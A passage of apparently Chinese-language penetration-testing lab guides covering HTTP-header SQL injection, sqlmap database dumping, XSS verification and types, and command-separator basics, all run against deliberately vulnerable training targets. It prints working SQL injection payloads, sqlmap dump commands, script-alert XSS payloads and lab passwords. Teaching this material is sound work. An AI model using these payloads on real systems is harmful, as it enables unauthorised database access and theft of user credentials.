table_schema=&#x27;security&#x27;))),&#x27;&#x27;,&#x27;&#x27;)# 显示结果中，有一个名为users的表，这当中可能存放着网站用户的基本信息。 注意：extractvalue()函数所能显示的错误信息最大长度为32，如果错误信息超过了最大长度，有可能导致显示不全。因此，有时需要借助limit来做分行显示，上述payload可以改为： 12345678910User-Agent:Mozilla/5.0......Firefox/46.0&#x27; and extractvalue(1,concat(&#x27;~&#x27;,(select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1))),&#x27;&#x27;,&#x27;&#x27;)#//显示security库中的第1张表的名字User-Agent:Mozilla/5.0......Firefox/46.0&#x27; and extractvalue(1,concat(&#x27;~&#x27;,(select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 1,1))),&#x27;&#x27;,&#x27;&#x27;)#//显示security库中的第2张表的名字User-Agent:Mozilla/5.0......Firefox/46.0&#x27; and extractvalue(1,concat(&#x27;~&#x27;,(select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 2,1))),&#x27;&#x27;,&#x27;&#x27;)#//显示security库中的第3张表的名字... 6 获取users表的全部字段名使用以下payload获取users表的全部字段名： 1User-Agent:Mozilla/5.0......Firefox/46.0&#x27; and extractvalue(1,concat(&#x27;~&#x27;,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;))),&#x27;&#x27;,&#x27;&#x27;)# 显示结果，users表中有id、username和password三个字段。 同上一个步骤相似，为了避免错误信息太长导致显示不全，有时需要借助limit来做分行显示，上述payload可以改为： 12345678910User-Agent:Mozilla/5.0......Firefox/46.0&#x27; and extractvalue(1,concat(&#x27;~&#x27;,(select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit 0,1))),&#x27;&#x27;,&#x27;&#x27;)#//显示users表中的第1个字段的名字User-Agent:Mozilla/5.0......Firefox/46.0&#x27; and extractvalue(1,concat(&#x27;~&#x27;,(select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit 1,1))),&#x27;&#x27;,&#x27;&#x27;)#//显示users表中的第2个字段的名字User-Agent:Mozilla/5.0......Firefox/46.0&#x27; and extractvalue(1,concat(&#x27;~&#x27;,(select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit 2,1))),&#x27;&#x27;,&#x27;&#x27;)#//显示users表中的第3个字段的名字... 7 获取users表id、username和password字段的全部值由于users表中存放着多组用户名和密码的数据，而每次只能显示一组数据，我们可以通过limit M,N的方式逐条显示，如 （1）显示第1组数据 1User-Agent:Mozilla/5.0......Firefox/46.0&#x27; and extractvalue(1,concat(&#x27;~&#x27;,(select concat_ws(&#x27;,&#x27;,id,username,password) from security.users limit 0,1))),&#x27;&#x27;,&#x27;&#x27;)# 显示结果为Dump，Dump。 （2）显示第2组数据 1User-Agent:Mozilla/5.0......Firefox/46.0&#x27; and extractvalue(1,concat(&#x27;~&#x27;,(select concat_ws(&#x27;,&#x27;,id,username,password) from security.users limit 1,1))),&#x27;&#x27;,&#x27;&#x27;)# 显示结果为Angelina，I-kill-you。 （3）显示第3组数据 1User-Agent:Mozilla/5.0......Firefox/46.0&#x27; and extractvalue(1,concat(&#x27;~&#x27;,(select concat_ws(&#x27;,&#x27;,id,username,password) from security.users limit 2,1))),&#x27;&#x27;,&#x27;&#x27;)# 显示结果为Dummy，p@ssword。 … 以此类推，可通过修改limit后面的参数，将users表中存放的所有用户信息全部暴露出来。实验至此结束。 实验总结本次实验，成功实现了对存在HTTP头部（User-Agent）注入点的网站的手工SQL注入，掌握了HTTP头部注入的原理、方法和流程。 SQL注入-HTTP头部注入2实验目的理解HTTP头部字段User-Agent、Referer、Cookie、X-Forwarded-For等的含义和作用，掌握HTTP头部注入的原理、方法及基本流程。 实验环境攻击机：Pentest-Atk（1）操作系统：Windows 10 （2）安装的应用软件：Sqlmap、Burpsuite、FireFox浏览器插件Hackbar、FoxyProxy等 （3）登录账号密码：操作系统帐号Administrator，密码Sangfor!7890 靶机：A-SQLi-Labs（1）操作系统：CentOS 7 （2）安装的应用软件：Apache、MySQL(MariaDB)、PHP；DVWA、SQLi-Labs、Webug3.0漏洞网站环境 （3）登录账号密码：操作系统帐号root，密码Sangfor!7890 实验原理有时候，后台开发人员为了验证客户端HTTP Header（比如常用的Cookie验证等）或者通过HTTPHeader头信息获取客户端的一些信息（比如User-Agent、Accept字段等），会对客户端HTTPHeader进行获取并使用SQL语句进行处理，如果此时没有足够的安全考虑，就可能导致基于HTTP Header的注入漏洞。常见的HTTP Header注入类型包括Cookie注入、Referer注入、User-Agent注入、XFF注入等。 实验步骤本实验的目标是：以Webug3.0网站的第五关为入口，利用报错注入的方式实施SQL注入，获取网站后台数据库中存放的flag。 1 访问Webug网站在攻击机Pentest-Atk打开FireFox浏览器，并访问靶机A-SQLi-Labs上的Webug网站。访问的URL为： 1http://[靶机IP]/webug/ (注意大小写) 2 利用Burpsuite工具抓包（1）启动Burpsuite 在攻击机Pentest-Atk的桌面文件夹Burp中，鼠标左键双击BURP.cmd程序，启动Burpsuite。 （2）设置Burpsuite的代理服务端口 在Burpsuite软件界面上选择选项卡“Proxy”-&gt;“Options”，在Proxy Listeners模块下，将Burpsuite的代理服务端口设置为8080（此为Burpsuite默认的服务端口）。 （3）开启Burpsuite的代理拦截功能 在Burpsuite软件界面上选择选项卡“Proxy”-&gt;“Intercept”，将拦截开关按钮的状态设置为“Intercept is on”。 注意：上述设置完成之后，不要关闭Burpsuite！ （4）设置Firefox代理 回到FireFox浏览器界面，鼠标右键单击浏览器地址栏右方的FoxyProxy插件图标按钮，在弹出的菜单中选择“为全部URLs启用代理服务器127.0.0.1:8080”: 代理设置成功后，FoxyProxy插件图标会变成蓝色。 （5）利用Burpsuite工具拦截HTTP请求包 在Webug网站主页选择第五关（“头部的一个注入”）： 此时Burpsuite会拦截到HTTP请求包： （6）将Burpsuite工具拦截到的HTTP请求包发送至Repeater模块 选中拦截到的HTTP请求包全部内容，单击鼠标右键，在弹出的菜单中选择“Send to Repeater”，将其发送给Burpsuite的Repeater模块。 发送成功后，在Burpsuite的Repeater选项卡下能够看到刚刚拦截的HTTP请求包内容。 后续的步骤中，可以在Repeater选项卡下的Request栏中设置注入的payload，设置完成后点击Send按钮发送，并在Response栏中观察目标服务器的响应。 3 寻找注入点（1）对拦截到的HTTP请求包不做任何修改，直接点击Send发送，此时Response-&gt;Pretty下显示的内容： Response-&gt;Render下显示的内容： （2）在原始的HTTP请求包中添加头部字段X-Forwarded-For，并使用如下payload： 1X-Forwarded-For:a&#x27; 此时，服务器端报错！ 由此可以判断，目标网站在头部字段XFF处存在注入点。 4 判断网站查询的字段数使用如下payload判断网站查询的字段数： 1X-Forwarded-For:order by 2 未报错！ 1X-Forwarded-For:order by 3 未报错！ 1X-Forwarded-For:order by 4 未报错！ 1X-Forwarded-For:order by 5 报错！ 由上述结果可以判断，网站查询的字段数为4。 5 判断网站的回显位置使用如下payload判断网站的回显位置： 1X-Forwarded-For:union select 1,2,3,4 由上述结果可以判断，网站有三个回显位置：2号位、3号位和4号位。 6 获取网站当前所在的数据库的库名使用如下payload获取网站当前所在的数据库的库名： 1X-Forwarded-For:union select 1,database(),3,4 由上述结果可以得知，网站当前所在的数据库的库名为pentesterlab。 7 获取pentesterlab数据库中所有的表名使用如下payload获取pentesterlab数据库中所有的表名： 1X-Forwarded-For:union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=&#x27;pentesterlab&#x27; 由上述结果可以得知，pentesterlab数据库中含有comment、flag、goods和user四张表。其中，flag表中可能存放着flag信息。 8 获取flag表中的字段名使用如下payload获取flag表中的字段名： 1X-Forwarded-For:union select 1,group_concat(column_name),3,4 from information_schema.columns where table_schema=&#x27;pentesterlab&#x27; and table_name=&#x27;flag&#x27; 由上述结果可以得知，flag表中有两个字段id、flag。 9 获取flag表中的flag字段的内容使用如下payload获取flag表中的flag字段的内容： 1X-Forwarded-For:union select 1,flag,3,4 from pentesterlab.flag 由上述结果可以得知，该flag字段的内容为204f704fbbcf6acf398ffee11989b377。实验至此结束。 实验总结本次实验，成功实现了对存在HTTP头部（X-Forwarded-For）注入点的网站的手工SQL注入，掌握了HTTP头部注入的原理、方法和流程。 SQL注入-SQLMAP基础使用1实验目的了解SQLMAP的工作原理，熟悉SQLMAP的常用命令，掌握SQLMAP的-u参数的基本使用方法。 实验环境攻击机：Pentest-Atk（1）操作系统：Windows 10 （2）安装的应用软件：Sqlmap、Burpsuite、FireFox浏览器插件Hackbar、FoxyProxy等 （3）登录账号密码：操作系统帐号Administrator，密码Sangfor!7890 靶机：A-SQLi-Labs（1）操作系统：CentOS 7 （2）安装的应用软件：Apache、MySQL(MariaDB)、PHP；DVWA、SQLi-Labs、Webug3.0漏洞网站环境 （3）登录账号密码：操作系统帐号root，密码Sangfor!7890 实验原理SQLMAP是一个开源的自动化SQL注入工具，其主要功能是扫描、发现并利用给定的URL的SQL注入漏洞。SQLMAP的基本功能包括：判断可注入的参数、判断可以使用哪一种SQL注入技术进行注入、判断识别数据库的类型以及根据用户的选择从数据库中读取数据。SQLMAP支持的注入技术包括以下五种：（1）基于布尔的盲注：根据返回页面判断条件真假的注入。（2）基于时间的盲注：不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。（3）基于报错的注入：页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。（4）基于联合查询的注入：可以使用UNION的情况下的注入。（5）堆查询注入：同时执行多条语句的注入。SQLMAP支持的数据库类型主要包括一些关系型数据库（RMDBS），如MySQL、Oracle、PostgreSQL、Microsoft SQL Server、Microsoft Access、IBM DB2、SQLite、Firebird、Sybase、SAPMaxDB、Informix、HSQLDB等。 实验步骤本实验的目标是：以SQLi-Labs网站的Less-3为入口，利用SQLMAP实施自动化SQL注入，获取SQLi-Labs网站的登录用户名和密码。 1 访问SQLi-Labs网站在攻击机Pentest-Atk打开FireFox浏览器，并访问靶机A-SQLi-Labs上的SQLi-Labs网站Less-3。访问的URL为： 1http://[靶机IP]/sqli-labs/Less-3/ (注意大小写) 登录后，根据网页提示，先给定一个GET参数，即： 1http://[靶机IP]/sqli-labs/Less-3/?id=1 此时页面显示id&#x3D;1的用户名Dump、密码Dump。 2 启动SQLMAP启动Windows操作系统的命令行工具cmd： 在命令行工具cmd中输入以下命令，进入SQLMAP程序所在的路径： 1cd C:\\Users\\Administrator\\Desktop\\tools\\装机工具\\sqlmap-master 进入SQLMAP程序所在的路径后，使用以下命令启动SQLMAP帮助： 1python sqlmap.py -h 3 寻找注入点使用以下命令自动寻找网站的注入点，并获取网站及后台数据库的基本信息： 1python sqlmap.py -u &quot;http://[靶机IP]/sqli-labs/Less-3/?id=1&quot; 检测结果如下图所示： 4 获取所有数据库的库名（1）使用以下命令获取所有数据库的库名： 1python sqlmap.py -u &quot;http://[靶机IP]/sqli-labs/Less-3/?id=1&quot; --dbs 检测结果如下图所示： （2）使用以下命令获取网站当前所在数据库的库名： 1python sqlmap.py -u &quot;http://[靶机IP]/sqli-labs/Less-3/?id=1&quot; --current-db 检测结果：网站当前所在数据库的库名为security。 5 获取security数据库中所有的表名使用以下命令获取security数据库中所有的表名： 1python sqlmap.py -u &quot;http://[靶机IP]/sqli-labs/Less-3/?id=1&quot; -D security --tables 检测结果：security数据库中含有emails、referers、uagents、users四张表。 其中，有一个名为users的表，这当中可能存放着网站用户的基本信息。 6 获取users表的全部字段名使用以下命令获取users表的全部字段名： 1python sqlmap.py -u &quot;http://[靶机IP]/sqli-labs/Less-3/?id=1&quot; -D security -T users --columns 检测结果：users表中有三个字段id、username和password。 7 获取users表id、username和password字段的全部值使用以下命令获取users表id、username和password字段的全部值： 1python sqlmap.py -u &quot;http://[靶机IP]/sqli-labs/Less-3/?id=1&quot; -D security -T users -C id,username,password --dump 检测结果如下图所示： 实验至此结束。 实验总结本次实验，成功利用SQLMAP对存在GET型注入点的网站进行了自动化SQL注入，掌握了SQLMAP的-u参数的基本使用方法。 SQL注入-SQLMAP基础使用2实验目的了解SQLMAP的工作原理，熟悉SQLMAP的常用命令，掌握SQLMAP的-r参数的基本使用方法。 实验环境攻击机：Pentest-Atk（1）操作系统：Windows 10 （2）安装的应用软件：Sqlmap、Burpsuite、FireFox浏览器插件Hackbar、FoxyProxy等 （3）登录账号密码：操作系统帐号Administrator，密码Sangfor!7890 靶机：A-SQLi-Labs（1）操作系统：CentOS 7 （2）安装的应用软件：Apache、MySQL(MariaDB)、PHP；DVWA、SQLi-Labs、Webug3.0漏洞网站环境 （3）登录账号密码：操作系统帐号root，密码Sangfor!7890 实验原理SQLMAP是一个开源的自动化SQL注入工具，其主要功能是扫描、发现并利用给定的URL的SQL注入漏洞。SQLMAP的基本功能包括：判断可注入的参数、判断可以使用哪一种SQL注入技术进行注入、判断识别数据库的类型以及根据用户的选择从数据库中读取数据。SQLMAP支持的注入技术包括以下五种：（1）基于布尔的盲注：根据返回页面判断条件真假的注入。（2）基于时间的盲注：不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。（3）基于报错的注入：页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。（4）基于联合查询的注入：可以使用UNION的情况下的注入。（5）堆查询注入：同时执行多条语句的注入。SQLMAP支持的数据库类型主要包括一些关系型数据库（RMDBS），如MySQL、Oracle、PostgreSQL、Microsoft SQL Server、Microsoft Access、IBM DB2、SQLite、Firebird、Sybase、SAPMaxDB、Informix、HSQLDB等。 实验步骤本实验的目标是：以SQLi-Labs网站的Less-4为入口，利用SQLMAP实施自动化SQL注入，获取SQLi-Labs网站的登录用户名和密码。 1 访问SQLi-Labs网站在攻击机Pentest-Atk打开FireFox浏览器，并访问靶机A-SQLi-Labs上的SQLi-Labs网站Less-4。访问的URL为： 1http://[靶机IP]/sqli-labs/Less-4/ (注意大小写) 2 利用Burpsuite工具抓包（1）启动Burpsuite 在攻击机Pentest-Atk的桌面文件夹Burp中，鼠标左键双击BURP.cmd程序，启动Burpsuite。 （2）设置Burpsuite的代理服务端口 在Burpsuite软件界面上选择选项卡“Proxy”-&gt;“Options”，在Proxy Listeners模块下，将Burpsuite的代理服务端口设置为8080（此为Burpsuite默认的服务端口）。 （3）开启Burpsuite的代理拦截功能 在Burpsuite软件界面上选择选项卡“Proxy”-&gt;“Intercept”，将拦截开关按钮的状态设置为“Intercept is on”。 注意：上述设置完成之后，不要关闭Burpsuite！ （4）设置Firefox代理 回到FireFox浏览器界面，鼠标右键单击浏览器地址栏右方的FoxyProxy插件图标按钮，在弹出的菜单中选择“为全部URLs启用代理服务器127.0.0.1:8080”: 代理设置成功后，FoxyProxy插件图标会变成蓝色。 （5）利用Burpsuite工具拦截HTTP请求包 在Firefox地址栏中给定一个GET参数，将URL修改为： 1http://[靶机IP]/sqli-labs/Less-4/?id=1 回车提交，此时观察Burpsuite是否能正常拦截到此HTTP请求报文。 （6）保存此HTTP请求包 在Burpsuite的Proxy-&gt;Intercept界面下选中刚刚拦截到的HTTP请求报文的全部内容，单击鼠标右键，在弹出的菜单中选择copy，将请求包的内容拷贝至文本文档a.txt中，并保存至C盘根目录。 3 启动SQLMAP启动Windows操作系统的命令行工具cmd： 在命令行工具cmd中输入以下命令，进入SQLMAP程序所在的路径： 1cd C:\\Users\\Administrator\\Desktop\\tools\\装机工具\\sqlmap-master 进入SQLMAP程序所在的路径后，使用以下命令启动SQLMAP帮助： 1python sqlmap.py -h 4 寻找注入点使用以下命令自动寻找网站的注入点，并获取网站及后台数据库的基本信息： 1python sqlmap.py -r C:\\a.txt 检测结果如下图所示： 5 获取所有数据库的库名（1）使用以下命令获取所有数据库的库名： 1python sqlmap.py -r C:\\a.txt --dbs 检测结果如下图所示： （2）使用以下命令获取网站当前所在数据库的库名： 1python sqlmap.py -r C:\\a.txt --current-db 检测结果：网站当前所在数据库的库名为security。 6 获取security数据库中所有的表名使用以下命令获取security数据库中所有的表名： 1python sqlmap.py -r C:\\a.txt -D security --tables 检测结果：security数据库中含有emails、referers、uagents、users四张表。 其中，有一个名为users的表，这当中可能存放着网站用户的基本信息。 7 获取users表的全部字段名使用以下命令获取users表的全部字段名： 1python sqlmap.py -r C:\\a.txt -D security -T users --columns 检测结果：users表中有三个字段id、username和password。 8 获取users表id、username和password字段的全部值使用以下命令获取users表id、username和password字段的全部值： 1python sqlmap.py -r C:\\a.txt -D security -T users -C id,username,password --dump 检测结果如下图所示： 实验至此结束。 实验总结本次实验，成功利用SQLMAP对存在GET型注入点的网站进行了自动化SQL注入，掌握了SQLMAP的-r参数的基本使用方法。","tags":["sxf","Red"],"categories":["Experiments"]},{"title":"某厂产业教育 - XSS漏洞原理与验证","path":"/2024/09/13/红蓝攻防/ⅥRXSS漏洞原理与验证/","content":"XSS验证实验目的通过本实验，掌握XSS漏洞的原理以及XSS漏洞的验证方法。 实验环境 操作机：Win10用户名：Administrator密码：Sangfor!7890 靶机：Apache + PHP 实验地址：http://ip/xss/03/xss.html 实验原理构造弹窗的代码提交，浏览器在执行该代码后就会执行弹框的操作，弹框的目的是验证提交的JS代码是否被执行，从而验证XSS漏洞是否存在。 实验步骤1、登陆”Attack”操作机，打开浏览器，访问http://ip/xss/03/xss.html 2、利用验证XSS漏洞常用的弹窗语句，在文本框中输入 1&lt;script&gt;alert(/xss/)\\&lt;/script&gt; 点击“搜索”按钮，验证页面是否弹框 3、页面成功弹窗 5、返回到http://ip/xss/03/xss.html页面，利用验证XSS漏洞其他弹窗语句，在文本框中输入“confirm(/xss/)“，点击“搜索”按钮，验证页面是否弹框 6、页面成功弹窗 7、利用验证XSS漏洞其他弹窗语句，在文本框中输入”prompt(/xss/)“，点击“搜索”按钮，验证页面是否弹框 8、页面成功弹窗 实验总结通过本实验，掌握XSS漏洞的验证方法，通过构造弹框代码提交，查看页面是否弹框，从而验证页面是否存在XSS漏洞。 XSS漏洞分类实验目的通过本实验，掌握XSS的原理和利用方法，通过三个类型的不同演示掌握XSS的不同分类以及之间的区别。 实验环境 操作机：Win10用户名：Administrator密码：Sangfor!7890 靶机：Apache + PHP 实验地址：http://ip/dvwa/login.php 实验原理借助DVWA靶场，通过不同分类的演示效果，掌握XSS不同分类之间的区别。 实验步骤反射型XSS1、登陆”Attack”操作机，打开浏览器，访问http://ip/dvwa/login.php 2、输入Username：admin和Password：password，登陆靶场 3、首先选中”DVWA Security”，调整级别为”Low”级别提交 4、选中”XSS（Reflected）”，跳转到反射型XSS环境下 5、在文本框内输入 1&lt;script&gt;alert(666)&lt;/script&gt; 点击“Submit”，提交输入的payload，弹框，触发XSS漏洞 6、右击，查看页面源代码 7、点击快捷键“Ctrl + F”，在代码中搜索 1alert 发现提交的payload被写进了页面的代码中 8、切换为靶场页面，点击其他任意位置，比如点击“CSRF”，然后再点击”XSS（Reflected）”，无任何反应，说明反射型XSS是非持久性的 存储型XSS1、选中”XSS（Stored）”，跳转到存储型XSS环境下 2、在留言板中填写payload 3、点击“Sign Guestbook”，提交填写的payload，弹框，触发XSS漏洞 4、点击“确定”，右击，查看页面源代码 5、点击快捷键“Ctrl + F”，在代码中搜索 1alert 发现提交的payload被写进了页面的代码中 6、切换为靶场页面，点击其他任意位置，比如点击“CSRF”，然后再点击”XSS（Stored）”，再次弹框，说明存储型XSS是持久性的 DOM型XSS1、选中”XSS（DOM）”，跳转到DOM型XSS环境下 2、点击“Select”，提交选择的数据 3、在URL中的default的值更改为 1&lt;script&gt;alert(666)&lt;/script&gt; 提交payload，弹框，触发XSS漏洞 4、点击“确定”，右击，查看页面源代码 5、点击快捷键“Ctrl + F”，在代码中搜索 1alert 发现提交的payload未写进页面的代码中 6、切换为靶场页面，点击其他任意位置，比如点击“CSRF”，然后再点击”XSS（DOM）”，无任何反应，说明DOM型XSS是非持久性的 实验总结通过本实验，掌握XSS的简单利用以及不同的分类之间的区别。 反射型XSS实验目的通过本实验，掌握XSS漏洞的原理以及根据XSS漏洞不同分类的方法，掌握反射型XSS的特点。 实验环境 操作机：Win10用户名：Administrator密码：Sangfor!7890 靶机：Apache + PHP 实验地址：http://ip/xss/04/xss.html 实验原理在页面的搜索框位置，输入内容后会输出到页面中，尝试构造弹窗语句，看代码是否执行，从而判断是否存在XSS漏洞。 实验步骤1、登陆”Attack”操作机，打开浏览器，访问http://ip/xss/04/xss.html 2、在搜索框的位置，输入“sangfor”，点击搜索按钮，查看页面变化 3、提交的内容显示在页面中 4、返回搜索框页面，构造弹框语句 1&lt;script&gt;alert(/xss/)\\&lt;/script&gt; 查看页面是否弹窗 5、点击“搜索”，页面成功弹窗 6、点击“确定”，右击，查看页面源代码，发现提交的payload成功写入页面中，并且是非持久型XSS，说明是反射型XSS 实验总结通过本实验，掌握反射型XSS的特点，根据挖掘出来的该XSS漏洞是非持久性的，并且数据流量走向是浏览器到后端，再到浏览器，提交的payload成功写入页面中，结合XSS漏洞不同分类的方法，验证反射型XSS的特点。 反射型XSS实验目的通过本实验，掌握挖掘XSS漏洞的方法以及根据XSS漏洞不同分类的特点，判断挖掘出来的XSS漏洞属于什么类型的。 实验环境 操作机：Win10用户名：Administrator密码：Sangfor!7890 靶机：Apache + PHP 实验地址：http://ip/webug/pentest/test/9/ 实验原理在页面点击，找到URL中传参位置，构造Payload使其弹框，根据不同分类特点判断漏洞类型。 实验步骤1、登陆”Attack”操作机，打开浏览器，访问http://ip/webug/pentest/test/9/ 2、页面没有任何信息，只有一个超链接，点击超链接，发现URL中有传参的位置 3、将URL中的参数值更改为“xss”，发现页面中的数据更改 4、将URL中的参数值更改为XSS验证的payload 1&lt;script&gt;alert(666)&lt;/script&gt; 页面弹框 5、点击“确定”，右击，查看页面源代码，发现提交的payload被写入页面中 6、返回网站页面，点击超链接，页面未弹框，需要重新提交payload，说明该网站的XSS漏洞是非持久性的，从而判断出该网站的XSS漏洞是反射型XSS 实验总结通过本实验，掌握挖掘XSS漏洞的方法以及根据XSS漏洞不同分类的特点，判断挖掘出来的XSS漏洞是非持久性的，且提交的payload会写入页面中，属于反射型XSS。 存储型XSS实验目的通过本实验，掌握XSS漏洞的原理以及根据XSS漏洞不同分类的方法，掌握存储型XSS的特点。 实验环境 操作机：Win10用户名：Administrator密码：Sangfor!7890 靶机：Apache + PHP 实验地址：http://ip/xss/05/xss.html 实验原理在页面的文本框位置，输入内容后会保存到数据库中，通过访问不同的id可以访问到内容，尝试构造弹窗语句插入到数据库中，再通过id访问调用弹框语句，看代码是否执行，从而判断是否存在XSS漏洞。 实验步骤1、登陆”Attack”操作机，打开浏览器，访问http://ip/xss/05/xss.html 2、在文本框的位置，输入“sangfor”，点击提交按钮，查看页面变化 3、页面显示“1”，访问http://ip/xss/05/result.php?id=1，查看页面变化 4、页面显示提交的内容，说明通过id的访问可以将提交的内容调用，显示到页面中 5、返回提交内容页面，构造弹框语句 1&lt;script&gt;alert(/xss/)\\&lt;/script&gt; 查看页面是否弹窗 6、点击“提交”，页面没有弹窗，访问http://ip/xss/05/result.php?id=3，查看页面变化 6、页面成功弹窗，并且是持久性的xss 实验总结通过本实验，掌握存储型XSS的特点，根据挖掘出来的该XSS漏洞是持久性的，并且数据流量走向是浏览器到后端到数据库，再到后端到浏览器，提交的payload成功写入数据库中，结合XSS漏洞不同分类的方法，验证存储型XSS的特点。 存储型XSS漏洞挖掘实验目的通过本实验，掌握挖掘XSS漏洞的方法以及根据XSS漏洞不同分类的特点，判断挖掘出来的XSS漏洞属于什么类型的。 实验环境 操作机：Win10用户名：Administrator密码：Sangfor!7890 靶机：Apache + PHP 实验地址：http://ip/webug/pentest/test/10/ 实验原理在页面留言板位置，构造Payload使其弹框，根据不同分类特点判断漏洞类型。 实验步骤1、登陆”Attack”操作机，打开浏览器，访问http://ip/webug/pentest/test/10/ 2、页面只有留言板，在留言板中输入“xss”，提交留言 3、在留言板中提交payload 1&lt;script&gt;alert(666)&lt;/script&gt; 页面弹框 4、点击“确定”，刷新页面，再次弹框，不需要重新提交payload，说明该网站的XSS漏洞是持久性的，从而判断出该网站的XSS漏洞是存储型XSS 实验总结通过本实验，掌握挖掘XSS漏洞的方法以及根据XSS漏洞不同分类的特点，判断挖掘出来的XSS漏洞是持久性的，用户每次访问该页面都会触发弹框，属于存储型XSS。 DOM型XSS实验目的通过本实验，掌握XSS漏洞的原理以及根据XSS漏洞不同分类的方法，掌握DOM型XSS的特点。 实验环境 操作机：Win10用户名：Administrator密码：Sangfor!7890 靶机：Apache + PHP 实验地址：http://ip/xss/06/index.php 实验原理在页面URL的位置，传入”message”参数，从而构造Payload使其弹框，掌握DOM型XSS的特点。 实验步骤1、登陆”Attack”操作机，打开浏览器，访问http://ip/xss/06/index.php 2、页面没有任何有用信息，只是把URL地址输入在页面中，右键，查看页面源代码 3、从代码中可以看出需要传递“message”的参数，并截取参数后的值写入到页面中，返回页面给“message”参数传递一个值 4、将“message”参数的值改为payload 1&lt;script&gt;alert(666)&lt;/script&gt; 弹框 5、点击“确定”，右击，查看页面源代码，发现提交的payload未写入页面中，说明是DOM型XSS 实验总结通过本实验，掌握DOM型XSS的特点，根据挖掘出来的该XSS漏洞是非持久性的，并且数据流量走向是URL到浏览器，未经过后端，提交的payload未写入页面中，结合XSS漏洞不同分类的方法，验证DOM型XSS的特点。 DOM型XSS漏洞挖掘实验目的通过本实验，掌握挖掘XSS漏洞的方法以及根据XSS漏洞不同分类的特点，判断挖掘出来的XSS漏洞属于什么类型的。 实验环境 操作机：Win10用户名：Administrator密码：Sangfor!7890 靶机：Apache + PHP 实验地址：http://ip/xss/06/dom1.php 实验原理在页面URL的位置，传入”name”参数，从而构造Payload使其弹框，掌握DOM型XSS的特点。 实验步骤1、登陆”Attack”操作机，打开浏览器，访问http://ip/xss/06/dom1.php 2、页面没有任何有用信息，在URL中传入name参数并赋值，访问http://ip/xss/06/dom1.php?name=sangfor，页面显示name参数的值 3、构造XSS验证语句，传入name参数，成功弹框 实验总结通过本实验，掌握挖掘XSS漏洞的方法以及根据XSS漏洞不同分类的特点，构造XSS验证语句，使页面弹框；判断挖掘出来的XSS漏洞是非持久性的，用户每次访问该页面都需要构造一次payload才会触发弹框，属于DOM型XSS。 DOM型XSS漏洞挖掘实验目的通过本实验，掌握挖掘XSS漏洞的方法以及根据XSS漏洞不同分类的特点，判断挖掘出来的XSS漏洞属于什么类型的。 实验环境 操作机：Win10用户名：Administrator密码：Sangfor!7890 靶机：Apache + PHP 实验地址：http://ip/xss/06/dom2.php 实验原理在页面文本框的位置，传入提交的数据，从而构造Payload使其弹框，掌握DOM型XSS的特点。 实验步骤1、登陆”Attack”操作机，打开浏览器，访问http://ip/xss/06/dom2.php 2、在文本框中输入任意字符串，比如“xss”，然后点击“替换”，页面字符串发生替换 3、构造XSS验证语句 1&lt;img src=1 _onerror=alert(1)&gt; 输入文本框，成功弹框 实验总结通过本实验，掌握挖掘XSS漏洞的方法以及根据XSS漏洞不同分类的特点，构造XSS验证语句，使页面弹框；判断挖掘出来的XSS漏洞是非持久性的，用户每次访问该页面都需要构造一次payload才会触发弹框，属于DOM型XSS。 XSS Payload构造及变形实验目的通过本实验，掌握构造各种XSS的Payload，从而绕过XSS的防护，使其弹框，挖掘XSS漏洞。 实验环境 操作机：Win10用户名：Administrator密码：Sangfor!7890 靶机：Apache + PHP 实验地址：http://ip/xss/07/index.php 实验原理在页面中，网站通常会对用户的输入进行过滤，可以构造各种不同的Payload以及对Payload进行变形，使其绕过验证进行弹框，挖掘XSS漏洞。 实验步骤1、登陆”Attack”操作机，打开浏览器，访问http://ip/xss/07/index.php Payload构造2、在文本域中输入构造的Payload，利用【&lt;&gt;】构造标签 3、利用HTML标签的属性值 4、利用事件 Payload变形5、大小写 6、引号 7、【&#x2F;】代替空格 8、Tab与回车 9、编码 实验总结通过本实验，掌握Web网站在对用户输入进行过滤，但是过滤不严格时，可以构造各种不同的Payload以及对XSS的Payload进行变形，使其绕过过滤机制，使网站弹框，从而挖掘XSS漏洞。","tags":["sxf","Red"],"categories":["Experiments"]},{"title":"某厂产业教育 - 命令执行漏洞原理与验证","path":"/2024/09/13/红蓝攻防/ⅧR命令执行漏洞原理与验证/","content":"管道符号实验目的通过本实验，掌握Windows操作系统和Linxu操作系统常用的管道符号以及不同管道符号的区别。 实验环境 操作机：Kali2018用户名：root密码：Sangfor!7890 靶机：Apache + PHP 实验地址：http://ip/include/include.php 实验原理通过Windows和Linux不同操作系统执行不同管道符号查看执行结果，掌握不同管道符号的区别。 12345678910Linux常用管道符：;前面的执行完执行后面的|是管道符，显示后面的执行结果||当前面的执行出错时执行后面的Windows常用管道符&amp;前面的语句为假则直接执行后面的&amp;&amp;前面的语句为假则直接出错，后面的也不执行|直接执行后面的语句||前面出错执行后面的 实验步骤Linux管道符1、登陆kali2018，打开终端 2、在终端中输入”whoami;ls”，查看”;”管道符前后两个命令都正确的结果 3、在终端中输入”whoam;ls”，查看”;”管道符前面命令错误，后面命令正确的结果 4、在终端中输入”whoami;lss”，查看”;”管道符前面命令正确，后面命令错误的结果 5、在终端中输入”whoami|ls”，查看”|”管道符前后两个命令都正确的结果 6、在终端中输入”whoam|ls”，查看”|”管道符前面命令错误，后面命令正确的结果 7、在终端中输入”whoami|lss”，查看”|”管道符前面命令正确，后面命令错误的结果 8、在终端中输入”whoami||ls”，查看”||”管道符前后两个命令都正确的结果 9、在终端中输入”whoam||ls”，查看”||”管道符前面命令错误，后面命令正确的结果 10、在终端中输入”whoami|lss”，查看”|”管道符前面命令正确，后面命令错误的结果 Windows管道符1、打开浏览器，访问http://ip/include/include.php?page=xxx.php，获取Web根目录，判断服务器操作系统为Windows 2、打开Burp Suite抓包工具 3、切换到“Proxy”代理模块的“Options”，查看Bp的代理 